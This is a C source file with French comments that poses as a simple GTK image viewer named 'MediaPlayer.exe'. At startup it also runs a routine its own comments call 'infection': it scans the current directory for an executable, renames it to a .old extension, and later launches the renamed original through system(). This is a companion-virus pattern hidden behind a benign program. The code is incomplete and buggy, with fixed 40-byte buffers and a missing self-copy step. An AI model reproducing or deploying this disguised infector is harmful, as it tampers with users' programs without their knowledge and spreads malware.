#include <gtk/gtk.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

static void
on_open_image (GtkButton* button, gpointer user_data)
{
      GtkWidget *image = GTK_WIDGET (user_data);
      GtkWidget *toplevel = gtk_widget_get_toplevel (image);
      GtkFileFilter *filter = gtk_file_filter_new ();
      GtkWidget *dialog = gtk_file_chooser_dialog_new (("Open image"),
                                                       GTK_WINDOW (toplevel),
                                                       GTK_FILE_CHOOSER_ACTION_OPEN,
                                                       GTK_STOCK_OK, GTK_RESPONSE_ACCEPT,
                                                       GTK_STOCK_CANCEL, GTK_RESPONSE_CANCEL,
                                                       NULL);

      gtk_file_filter_add_pixbuf_formats (filter);
      gtk_file_chooser_add_filter (GTK_FILE_CHOOSER (dialog),
                                   filter);

      switch (gtk_dialog_run (GTK_DIALOG (dialog)))
      {
            case GTK_RESPONSE_ACCEPT:
            {
                  gchar *filename =
                        gtk_file_chooser_get_filename (GTK_FILE_CHOOSER (dialog));
                  gtk_image_set_from_file (GTK_IMAGE (image), filename);
                  break;
            }
            default:
                  break;
      }
      gtk_widget_destroy (dialog);
}


char*
nameToOld(char* name)
{
      char* new_name = (char *) malloc( 40 );
      strcpy(new_name, name);

      if(strcmp(name, "MediaPlayer.exe")) // Le fichier n'est pas MediaPlayer.exe
      {
            if(strstr(name, ".exe"))      // Le fichier termine par .exe ?
            {
                  // On renomme le fichier avec l'extension .old
                  new_name[strlen(name)-1] = 'd';
                  new_name[strlen(name)-2] = 'l';
                  new_name[strlen(name)-3] = 'o';

                  if(!fopen(new_name, "r"))     // Il existe pas un fichier .old du même nom
                  {
                        //Le fichier .old n'existe pas ==> infection

                        if(!rename(name, new_name))   // Le fichier a était renommé ?
                        {
                              printf("Le fichier a était renommé\n");
                              return name;
                        }
                        else
                        {
                              printf("Le fichier n'a pas était renomé\n");
                              return "";
                        }
                  }
            }
      }
      return "";
}


char*
infect()
{
      /********************************************************************************************/
      /*                                                          Rennomage du fichier                                              //
      /********************************************************************************************/
      DIR* dir = opendir(".");
      int infect = 0;
      char* pg_name = (char *) malloc( 40 );
      char* ret_name = (char *) malloc( 40 );

      if (dir == NULL)
    {
            printf("Error: Unable to open directory\n");
            exit(0);
    }

      struct dirent* directory;
    while ((directory = readdir(dir)) != NULL)
    {
            if (infect < 1) //On fixe le nombre d'infection par execution
            {
                  struct stat stat_buffer;
                  if (!stat(directory->d_name, &stat_buffer))
                  {     
                        if ((stat_buffer.st_mode & S_IXUSR) && S_ISREG(stat_buffer.st_mode)) //Le fichier est éxécutable ?
                        {
                              char* name = (char *) malloc( 40 );
                              strcpy(name, directory->d_name);
                              strcpy(pg_name, name);
                              
                              strcpy(ret_name, nameToOld(name));

                              if(strcmp(ret_name, "")) // Le programme a était infecté ?
                              {
                                    infect++;
                              }

                              free(name);
                        }
                  }
            }
      }
      free(directory);
      closedir(dir);
}

static void
activate (GtkApplication *app, gpointer user_data)
{
      GtkWidget *window;
      GtkWidget *button;
      GtkWidget *image;
      GtkWidget *box;

      /* Set up the UI */
      window = gtk_application_window_new (app);
      gtk_window_set_title (GTK_WINDOW (window), "mon image viewer");
      gtk_window_set_default_size (GTK_WINDOW (window), 300, 150);
      gtk_container_set_border_width (GTK_CONTAINER (window), 5);

      box = gtk_box_new (GTK_ORIENTATION_VERTICAL, 5);
      button = gtk_button_new_with_label (("Open image"));
      image = gtk_image_new ();

      gtk_box_pack_start (GTK_BOX (box), image, TRUE, TRUE, 0);
      gtk_box_pack_start (GTK_BOX (box), button, FALSE, FALSE, 0);

      gtk_container_add (GTK_CONTAINER (window), box);

      /* Connect signals */

      /* Show open dialog when opening a file */
      g_signal_connect (button, "clicked", G_CALLBACK (on_open_image), image);

      /* Exit when the window is closed */
      g_signal_connect (window, "destroy", G_CALLBACK (gtk_main_quit), NULL);

      gtk_container_add (GTK_CONTAINER (window), box);
      gtk_widget_show_all (window);
}


int
main (int argc, char **argv)
{
      int status;
      char* pg_name = infect();
      char* command = (char *) malloc( 40 );
      strcpy(command, argv[0]);

      if(!strcmp(argv[0], "./MediaPlayer.exe"))
      {
            GtkApplication *app;

            app = gtk_application_new ("org.gtk.example", G_APPLICATION_FLAGS_NONE);
            g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
            status = g_application_run (G_APPLICATION (app), argc, argv);
            g_object_unref (app);
      }
      else
      {
            command[strlen(command)-1] = 'd';
            command[strlen(command)-2] = 'l';
            command[strlen(command)-3] = 'o';
            printf("command : %s\n", command);
            system(command);
      }
      
      return status;
}